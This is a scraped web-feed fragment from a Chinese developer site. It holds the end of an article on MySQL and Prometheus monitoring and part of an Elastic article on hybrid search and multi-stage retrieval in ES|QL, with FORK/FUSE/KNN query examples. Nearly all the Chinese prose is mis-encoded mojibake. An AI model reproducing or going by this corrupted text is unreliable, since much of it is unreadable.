å¯ä»¥çœ‹åˆ°mysqlå½“å‰qpsï¼Œæ´»è·ƒçº¿ç¨‹æ•°ï¼Œè¿æ¥æ•°ï¼Œç¼“å­˜æ± çš„å¤§å°ç­‰ä¿¡æ¯ã€‚</p>
<p>å¦‚æœå‘ç°æ•°æ®é‡è¿æ¥æ± å ç”¨å¤ªå¤šï¼Œå¯¹æ¥å£çš„æ€§èƒ½è‚¯å®šä¼šæœ‰å½±å“ã€‚</p>
<p>è¿™æ—¶å¯èƒ½æ˜¯ä»£ç ä¸­å¼€å¯äº†è¿æ¥å¿˜äº†å…³ï¼Œæˆ–è€…å¹¶å‘é‡å¤ªå¤§äº†å¯¼è‡´çš„ï¼Œéœ€è¦åšè¿›ä¸€æ­¥æ’æŸ¥å’Œç³»ç»Ÿä¼˜åŒ–ã€‚</p>
<p>æˆªå›¾ä¸­åªæ˜¯å®ƒä¸€å°éƒ¨åˆ†åŠŸèƒ½ï¼Œå¦‚æœä½ æƒ³äº†è§£æ›´å¤šåŠŸèƒ½ï¼Œå¯ä»¥è®¿é—®Prometheusçš„å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fprometheus.io%2F" target="_blank" title="https://prometheus.io/" ref="nofollow noopener noreferrer">prometheus.io/</a></p>
<p>å…¶å®ï¼Œé«˜å¹¶å‘çš„ç³»ç»Ÿä¸­ï¼Œè¿˜éœ€è¦è€ƒè™‘å®‰å…¨é—®é¢˜ï¼Œæ¯”å¦‚ï¼š</p>
<ol>
<li>é‡åˆ°ç”¨æˆ·ä¸æ–­å˜åŒ–ipåˆ·æ¥å£æ€åŠï¼Ÿ</li>
<li>é‡åˆ°ç”¨æˆ·å¤§é‡è®¿é—®ç¼“å­˜ä¸­ä¸å­˜åœ¨çš„æ•°æ®ï¼Œå¯¼è‡´ç¼“å­˜é›ªå´©æ€ä¹ˆåŠï¼Ÿ</li>
<li>å¦‚æœç”¨æˆ·å‘èµ·ddosæ”»å‡»æ€ä¹ˆåŠï¼Ÿ</li>
<li>ç”¨æˆ·å¹¶å‘é‡çªå¢ï¼Œå¯¼è‡´æœåŠ¡å™¨æ‰›ä¸ä½äº†ï¼Œå¦‚ä½•åŠ¨æ€æ‰©å®¹ï¼Ÿ</li>
</ol>
<p>æ„Ÿå…´è¶£çš„å°ä¼™ä¼´å¯ä»¥æ‰¾æˆ‘ç§èŠã€‚</p>
<p>å¦‚æœè¿™ç¯‡æ–‡ç« å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©ï¼Œæˆ–è€…æœ‰æ‰€å¯å‘çš„è¯ï¼Œå¸®å¿™å…³æ³¨ä¸€ä¸‹æˆ‘çš„åŒåå…¬ä¼—å·ï¼šè‹ä¸‰è¯´æŠ€æœ¯ï¼Œæ‚¨çš„æ”¯æŒæ˜¯æˆ‘åšæŒå†™ä½œæœ€å¤§çš„åŠ¨åŠ›ã€‚</p>
<p>æ±‚ä¸€é”®ä¸‰è¿ï¼šç‚¹èµã€è½¬å‘ã€åœ¨çœ‹ã€‚</p>
<p>å…³æ³¨å…¬ä¼—å·ï¼šã€è‹ä¸‰è¯´æŠ€æœ¯ã€‘ï¼Œåœ¨å…¬ä¼—å·ä¸­å›å¤ï¼šè¿›å¤§å‚ï¼Œå¯ä»¥å…è´¹è·å–æˆ‘æœ€è¿‘æ•´ç†çš„10ä¸‡å­—çš„é¢è¯•å®å…¸ï¼Œå¥½å¤šå°ä¼™ä¼´é è¿™ä¸ªå®å…¸æ‹¿åˆ°äº†å¤šå®¶å¤§å‚çš„offerã€‚</p>
<p>æ›´å¤šé¡¹ç›®å®æˆ˜åœ¨æˆ‘çš„æŠ€æœ¯åšå®¢ï¼šsusan.net.cn/project</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åœ¨ ES|QL ä¸­çš„æ··åˆæœç´¢å’Œå¤šé˜¶æ®µæ£€ç´¢]]></title>    <link>https://juejin.cn/post/7592912896591396883</link>    <guid>https://juejin.cn/post/7592912896591396883</guid>    <pubDate>2026-01-09T03:19:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592912896591396883" data-draft-id="7592887786966319140" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åœ¨ ES|QL ä¸­çš„æ··åˆæœç´¢å’Œå¤šé˜¶æ®µæ£€ç´¢"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2026-01-09T03:19:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åœ¨ ES|QL ä¸­çš„æ··åˆæœç´¢å’Œå¤šé˜¶æ®µæ£€ç´¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:19:04.000Z" title="Fri Jan 09 2026 03:19:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæ¥è‡ª ElasticÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Fioana-tagirta" title="https://www.elastic.co/search-labs/author/ioana-tagirta" target="_blank" ref="nofollow noopener noreferrer">Ioana Tagirta</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a19c9190184468ca51fb6615d85bc34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533548&amp;x-signature=9SRDnvJ6d7QvXuIEFwSs4BZmEW4%3D" alt="" loading="lazy"/></p>
<p>äº²èº«ä½“éªŒ Elasticsearchï¼šæ·±å…¥äº†è§£æˆ‘ä»¬çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felastic%2Felasticsearch-labs%3Ftab%3Dreadme-ov-file" title="https://github.com/elastic/elasticsearch-labs?tab=readme-ov-file" target="_blank" ref="nofollow noopener noreferrer">ç¤ºä¾‹ notebooks</a>ï¼Œå¼€å§‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fcloud%2Fcloud-trial-overview" title="https://www.elastic.co/cloud/cloud-trial-overview" target="_blank" ref="nofollow noopener noreferrer">å…è´¹çš„ cloud è¯•ç”¨</a>ï¼Œæˆ–ç«‹å³åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F143747798" title="https://elasticstack.blog.csdn.net/article/details/143747798" target="_blank" ref="nofollow noopener noreferrer">æœ¬åœ°æœºå™¨</a>ä¸Šè¯•ç”¨ Elasticã€‚</p>
<hr/>
<p>åœ¨ Elasticsearch 9.2 ä¸­ï¼Œæˆ‘ä»¬å¼•å…¥äº†åœ¨ Elasticsearch Query Languageï¼ˆ ES|QL ï¼‰ä¸­è¿›è¡Œå¯†é›†Â <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F145485873" title="https://elasticstack.blog.csdn.net/article/details/145485873" target="_blank" ref="nofollow noopener noreferrer">vector search</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F145697606" title="https://elasticstack.blog.csdn.net/article/details/145697606" target="_blank" ref="nofollow noopener noreferrer">hybrid search</a> çš„èƒ½åŠ›ã€‚è¿™å»¶ç»­äº†æˆ‘ä»¬å°† <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fexplore-analyze%2Fquery-filter%2Flanguages%2Fesql" title="https://www.elastic.co/docs/explore-analyze/query-filter/languages/esql" target="_blank" ref="nofollow noopener noreferrer">ES|QL</a> æ‰“é€ æˆè§£å†³ç°ä»£ search ç”¨ä¾‹çš„æœ€ä½³ search è¯­è¨€çš„æŠ•å…¥ã€‚</p>
<h2 data-id="heading-0">å¤šé˜¶æ®µæ£€ç´¢ï¼šç°ä»£æœç´¢çš„æŒ‘æˆ˜</h2>
<p>ç°ä»£æœç´¢å·²ç»ä¸å†åªæ˜¯ç®€å•çš„å…³é”®è¯åŒ¹é…ã€‚ä»Šå¤©çš„æœç´¢åº”ç”¨éœ€è¦ç†è§£æ„å›¾ï¼Œå¤„ç†è‡ªç„¶è¯­è¨€ï¼Œå¹¶ç»“åˆå¤šä¸ªæ’åºä¿¡å·æ¥æä¾›æœ€ä½³ç»“æœã€‚</p>
<p>æœ€ç›¸å…³ç»“æœçš„æ£€ç´¢æ˜¯åœ¨å¤šä¸ªé˜¶æ®µä¸­å®Œæˆçš„ï¼Œæ¯ä¸ªé˜¶æ®µéƒ½ä¼šé€æ­¥ç»†åŒ–ç»“æœé›†ã€‚è¿‡å»å¹¶éå¦‚æ­¤ï¼Œå½“æ—¶å¤§å¤šæ•°ç”¨ä¾‹åªéœ€è¦ä¸€åˆ°ä¸¤ä¸ªé˜¶æ®µçš„æ£€ç´¢ï¼šä¸€æ¬¡åˆå§‹æŸ¥è¯¢æ¥è·å–ç»“æœï¼Œä»¥åŠä¸€ä¸ªå¯èƒ½çš„é‡æ–°è¯„åˆ†é˜¶æ®µã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/83627cc18f12470a938737e74d7bfa39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533548&amp;x-signature=khVr2kt6jWy143GdhyvL42U5m%2Bs%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬ä»åˆå§‹æ£€ç´¢å¼€å§‹ï¼Œåœ¨è¿™ä¸€é˜¶æ®µæˆ‘ä»¬å¹¿æ³›æœç´¢ä»¥æ”¶é›†ä¸æˆ‘ä»¬æŸ¥è¯¢ç›¸å…³çš„ç»“æœã€‚ç”±äºéœ€è¦ç­›é€‰æ‰€æœ‰æ•°æ®ï¼Œæˆ‘ä»¬åº”è¯¥ä½¿ç”¨èƒ½å¤Ÿå¿«é€Ÿè¿”å›ç»“æœçš„æŠ€æœ¯ï¼Œå³ä½¿åœ¨ç´¢å¼•æ•°åäº¿æ–‡æ¡£æ—¶ä¹Ÿèƒ½é«˜æ•ˆã€‚</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬é‡‡ç”¨å¯é çš„æŠ€æœ¯ï¼Œä¾‹å¦‚ Elasticsearch ä»ä¸€å¼€å§‹å°±æ”¯æŒå¹¶ä¼˜åŒ–çš„è¯æ±‡æœç´¢ï¼Œæˆ–è€… Elasticsearch åœ¨é€Ÿåº¦å’Œå‡†ç¡®æ€§ä¸Šè¡¨ç°å‡ºè‰²çš„ vector searchã€‚</p>
<p>ä½¿ç”¨ BM25 çš„ lexical search éå¸¸å¿«ï¼Œæœ€é€‚åˆç²¾ç¡®çš„æœ¯è¯­åŒ¹é…æˆ–çŸ­è¯­åŒ¹é…ï¼Œè€Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Fvector" title="https://www.elastic.co/docs/solutions/search/vector" target="_blank" ref="nofollow noopener noreferrer">vector</a> æˆ– <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Fsemantic-search" title="https://www.elastic.co/docs/solutions/search/semantic-search" target="_blank" ref="nofollow noopener noreferrer">semantic search</a> æ›´é€‚åˆå¤„ç†è‡ªç„¶è¯­è¨€æŸ¥è¯¢ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F148668424" title="https://elasticstack.blog.csdn.net/article/details/148668424" target="_blank" ref="nofollow noopener noreferrer">Hybrid search</a> å°† lexical å’Œ vector search ç»“æœç»“åˆèµ·æ¥ï¼Œä»¥å‘æŒ¥ä¸¤è€…çš„ä¼˜åŠ¿ã€‚Hybrid search è§£å†³çš„æŒ‘æˆ˜åœ¨äº vector å’Œ lexical search æ‹¥æœ‰å®Œå…¨ä¸åŒä¸”ä¸å…¼å®¹çš„è¯„åˆ†å‡½æ•°ï¼Œå®ƒä»¬ç”Ÿæˆçš„å€¼åœ¨ä¸åŒåŒºé—´ï¼Œå¹¶éµå¾ªä¸åŒåˆ†å¸ƒã€‚vector search å¾—åˆ†æ¥è¿‘ 1 å¯èƒ½æ„å‘³ç€éå¸¸åŒ¹é…ï¼Œä½† lexical search å¹¶éå¦‚æ­¤ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fblog%2Fhybrid-search-elasticsearch" title="https://www.elastic.co/search-labs/blog/hybrid-search-elasticsearch" target="_blank" ref="nofollow noopener noreferrer">Hybrid search</a> æ–¹æ³•ï¼Œå¦‚ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Frest-apis%2Freciprocal-rank-fusion" title="https://www.elastic.co/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion" target="_blank" ref="nofollow noopener noreferrer">reciprocal rank fusion (RRF)</a> å’Œ scores çš„çº¿æ€§ç»„åˆï¼Œä¼šåˆ†é…æ–°çš„åˆ†æ•°ï¼Œå°† lexical å’Œ vector search çš„åŸå§‹åˆ†æ•°èåˆã€‚</p>
<p>åœ¨ hybrid search ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Franking%2Fsemantic-reranking" title="https://www.elastic.co/docs/solutions/search/ranking/semantic-reranking" target="_blank" ref="nofollow noopener noreferrer">semantic reranking</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Fsolutions%2Fsearch%2Franking%2Flearning-to-rank-ltr" title="https://www.elastic.co/docs/solutions/search/ranking/learning-to-rank-ltr" target="_blank" ref="nofollow noopener noreferrer">Learning To Rank (LTR)</a> ç­‰æŠ€æœ¯ï¼Œè¿™äº›æŠ€æœ¯ä½¿ç”¨ä¸“é—¨çš„ machine learning æ¨¡å‹å¯¹ç»“æœè¿›è¡Œé‡æ–°æ’åºã€‚</p>
<p>åˆ©ç”¨æœ€ç›¸å…³çš„ç»“æœï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ large language models (LLMs) è¿›ä¸€æ­¥ä¸°å¯Œæˆ‘ä»¬çš„å“åº”ï¼Œæˆ–åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Felasticstack.blog.csdn.net%2Farticle%2Fdetails%2F153720860" title="https://elasticstack.blog.csdn.net/article/details/153720860" target="_blank" ref="nofollow noopener noreferrer">Elastic Agent Builder</a> ç­‰å·¥å…·çš„ agentic å·¥ä½œæµä¸­ï¼Œå°†æœ€ç›¸å…³ç»“æœä½œä¸ºä¸Šä¸‹æ–‡ä¼ é€’ç»™ LLMsã€‚</p>
<p>ES|QL èƒ½å¤Ÿå¤„ç†æ£€ç´¢çš„æ‰€æœ‰è¿™äº›é˜¶æ®µã€‚ES|QL æœ¬èº«æ˜¯ä¸€ä¸ªç®¡é“è¯­è¨€ï¼Œæ¯æ¡å‘½ä»¤ä¼šè½¬æ¢è¾“å…¥å¹¶å°†è¾“å‡ºå‘é€åˆ°ä¸‹ä¸€æ¡å‘½ä»¤ã€‚æ¯ä¸ªæ£€ç´¢é˜¶æ®µç”±ä¸€ä¸ªæˆ–å¤šä¸ªè¿ç»­çš„ ES|QL å‘½ä»¤è¡¨ç¤ºã€‚æœ¬æ–‡å±•ç¤ºäº† ES|QL å¦‚ä½•æ”¯æŒæ¯ä¸ªé˜¶æ®µã€‚</p>
<h3 data-id="heading-1">Vector search - å‘é‡æœç´¢</h3>
<p>åœ¨ Elasticsearch 9.2 ä¸­ï¼Œæˆ‘ä»¬åœ¨ ES|QL ä¸­å¼•å…¥äº†å¯†é›† vector search çš„æŠ€æœ¯é¢„è§ˆæ”¯æŒã€‚è¿™å’Œè°ƒç”¨ knn å‡½æ•°ä¸€æ ·ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ª <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Felasticsearch%2Fmapping-reference%2Fdense-vector" title="https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/dense-vector" target="_blank" ref="nofollow noopener noreferrer">dense_vector</a> å­—æ®µå’Œä¸€ä¸ª query vectorï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> <span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector)
<span class="hljs-number">3.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>

`AIå†™ä»£ç 
</code></pre>
<p>æ­¤æŸ¥è¯¢æ‰§è¡Œè¿‘ä¼¼æœ€è¿‘é‚»æœç´¢ï¼Œæ£€ç´¢ä¸ query_vector æœ€ç›¸ä¼¼çš„ 100 ä¸ªæ–‡æ¡£ã€‚</p>
<h3 data-id="heading-2">æ··åˆæœç´¢ï¼šReciprocal rank fusion/RRF</h3>
<p>åœ¨ Elasticsearch 9.2 ä¸­ï¼Œæˆ‘ä»¬åœ¨ ES|QL ä¸­å¼•å…¥äº†ä½¿ç”¨ RRF å’Œç»“æœçº¿æ€§ç»„åˆçš„ hybrid search æ”¯æŒã€‚</p>
<p>è¿™å…è®¸å°† vector search å’Œ lexical search ç»“æœåˆå¹¶ä¸ºå•ä¸€çš„ç»“æœé›†ã€‚</p>
<p>è¦åœ¨ ES|QL ä¸­å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fcommands%2Ffork" title="https://www.elastic.co/docs/reference/query-languages/esql/commands/fork" target="_blank" ref="nofollow noopener noreferrer">FORK</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fdocs%2Freference%2Fquery-languages%2Fesql%2Fcommands%2Ffuse" title="https://www.elastic.co/docs/reference/query-languages/esql/commands/fuse" target="_blank" ref="nofollow noopener noreferrer">FUSE</a> å‘½ä»¤ã€‚<strong>FORK</strong> å¯ä»¥è¿è¡Œå¤šä¸ªæ‰§è¡Œåˆ†æ”¯ï¼Œ<strong>FUSE</strong> åˆ™åˆå¹¶ç»“æœï¼Œå¹¶ä½¿ç”¨ RRF æˆ–çº¿æ€§ç»„åˆåˆ†é…æ–°çš„ç›¸å…³æ€§åˆ†æ•°ã€‚</p>
<p>åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ FORK è¿è¡Œä¸¤ä¸ªç‹¬ç«‹çš„åˆ†æ”¯ï¼Œå…¶ä¸­ä¸€ä¸ªä½¿ç”¨ match å‡½æ•°è¿›è¡Œ lexical searchï¼Œå¦ä¸€ä¸ªä½¿ç”¨ knn å‡½æ•°è¿›è¡Œ vector searchã€‚ç„¶åæˆ‘ä»¬ä½¿ç”¨ FUSE å°†ç»“æœåˆå¹¶ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">4.</span>  <span class="hljs-operator">|</span> FUSE <span class="hljs-operator">/</span><span class="hljs-operator">/</span> uses RRF <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>
<span class="hljs-number">5.</span>  <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span>

`AIå†™ä»£ç 
</code></pre>
<p>è®©æˆ‘ä»¬åˆ†è§£æŸ¥è¯¢ä»¥æ›´å¥½åœ°ç†è§£æ‰§è¡Œæ¨¡å‹ï¼Œé¦–å…ˆæ¥çœ‹ FORK å‘½ä»¤çš„è¾“å‡ºï¼š</p>
<pre><code class="hljs language-sql" lang="sql">`

<span class="hljs-number">1.</span>  <span class="hljs-keyword">FROM</span> books METADATA _score, _id, _index
<span class="hljs-number">2.</span>  <span class="hljs-operator">|</span> FORK (<span class="hljs-keyword">WHERE</span> KNN(description_vector, ?query_vector) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)
<span class="hljs-number">3.</span>         (<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(description, ?query) <span class="hljs-operator">|</span> SORT _score <span class="hljs-keyword">DESC</span> <span class="hljs-operator">|</span> LIMIT <span class="hljs-number">100</span>)

`AIå†™ä»£ç 
</code></pre>
<p>FORK å‘½ä»¤è¾“å‡ºæ¥è‡ªä¸¤ä¸ªåˆ†æ”¯çš„ç»“æœï¼Œå¹¶æ·»åŠ äº†ä¸€ä¸ª _fork é‰´åˆ«å™¨åˆ—ï¼š</p>
<table><thead><tr><th>_id</th><th>title</th><th>_score</th><th>_fork</th></tr></thead><tbody><tr><td>4001</td><td>The Hobbit</td><td>0.88</td><td>fork1</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>0.88</td><td>fork1</td></tr><tr><td>4005</td><td>The Two Towers</td><td>0.86</td><td>fork1</td></tr><tr><td>4006</td><td>The Return of the King</td><td>0.84</td><td>fork1</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>0.78</td><td>fork1</td></tr><tr><td>4144</td><td>The Children of HÃºrin</td><td>0.79</td><td>fork1</td></tr><tr><td>4001</td><td>The Hobbit</td><td>4.55</td><td>fork2</td></tr><tr><td>3999</td><td>The Fellowship of the Ring</td><td>4.25</td><td>fork2</td></tr><tr><td>4123</td><td>The Silmarillion</td><td>4.11</td><td>fork2</td></tr><tr><td>4005</td><td>The Two Towers</td><td>3.8</td><td>fork2</td></tr><tr><td>4006</td><td>The Return of the King</td><td>4.1</td><td>fork2</td></tr></tbody></table>
